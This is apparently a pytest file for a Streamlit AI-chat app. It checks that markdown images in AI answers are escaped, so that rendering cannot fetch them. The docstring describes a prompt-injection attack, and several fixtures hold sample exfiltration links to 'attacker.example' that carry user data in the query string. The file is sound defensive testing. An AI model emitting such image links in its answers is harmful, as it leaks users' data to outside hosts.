"""AI answers must not load images when rendered (S6).

Streamlit's markdown fetches ``![alt](url)`` on display, with no click. A
prompt-injected answer could put the user's data into such a URL."""
import pytest
from streamlit.testing.v1 import AppTest

from app.ui.ai_chat._safe_markdown import safe_markdown, safe_stream

_IMAGE = "![chart](https://attacker.example/c.png?d=PC_34_1)"


class TestSafeMarkdown:
    def test_inline_image_is_escaped(self):
        assert safe_markdown(f"See {_IMAGE}") == (
            "See !\\[chart](https://attacker.example/c.png?d=PC_34_1)"
        )

    def test_reference_image_is_escaped(self):
        out = safe_markdown("![x][r]\n\n[r]: https://attacker.example/c.png")
        assert "![" not in out

    def test_links_and_plain_text_are_untouched(self):
        text = "Read [the paper](https://example.org). Wow! [1] a != b"
        assert safe_markdown(text) == text

    def test_is_idempotent(self):
        once = safe_markdown(_IMAGE)
        assert safe_markdown(once) == once


class TestSafeStream:
    @pytest.mark.parametrize("chunks", [
        ["See ", _IMAGE],
        ["See !", "[chart](https://attacker.example/c.png)"],
        ["See !", "", "[chart](https://attacker.example/c.png)"],
        list(f"See {_IMAGE}"),
    ])
    def test_no_image_survives_any_split(self, chunks):
        assert "![" not in "".join(safe_stream(chunks))

    def test_text_is_otherwise_unchanged(self):
        chunks = ["Hello", " wor", "ld!", "!", " done!"]
        assert "".join(safe_stream(chunks)) == "Hello world!! done!"


def stored_answer_script(tab):
    """Render one AI Studio tab with an image in a stored assistant message."""
    import pandas as pd
    import streamlit as st

    from app.adapters.streamlit_adapter import StreamlitAdapter
    from app.models.chat import ChatMessage, ChatMode, ChatSession
    from app.models.experiment import ExperimentConfig
    StreamlitAdapter.initialize_session_state()

    session = ChatSession(mode=ChatMode.DATA_QUESTIONS).add_message(
        ChatMessage(role="user", content="question"),
    ).add_message(ChatMessage(
        role="assistant",
        content="Answer ![chart](https://attacker.example/c.png?d=PC_34_1)",
    ))
    df = pd.DataFrame({"LipidMolec": ["PC 34:1"], "intensity[s1]": [1.0]})
    if tab == "data_questions":
        from app.ui.ai_chat._data_questions_ui import render_data_questions_chat
        st.session_state.chat_data_questions_session = session
        render_data_questions_chat(df)
    elif tab == "transform":
        from app.ui.ai_chat._data_transform_ui import render_transform_chat
        st.session_state.chat_transform_session = session
        render_transform_chat(df)
    elif tab == "viz":
        from app.ui.ai_chat._viz_generation_ui import render_viz_chat
        st.session_state.chat_viz_session = session
        render_viz_chat(df, ExperimentConfig(
            conditions_list=["A"], number_of_samples_list=[1],
        ))
    elif tab == "lc_questions":
        from app.ui.ai_chat._lipidcruncher_questions_ui import (
            render_lc_questions_chat,
        )
        st.session_state.chat_lc_questions_session = session
        render_lc_questions_chat()


@pytest.mark.parametrize(
    "tab", ["data_questions", "transform", "viz", "lc_questions"],
)
def test_stored_answers_render_without_images(tab):
    at = AppTest.from_function(
        stored_answer_script, args=(tab,), default_timeout=15,
    ).run()
    assert not at.exception
    bodies = [m.value for m in at.markdown]
    assert any("attacker.example" in b for b in bodies), "answer not rendered"
    assert not any("![" in b for b in bodies)
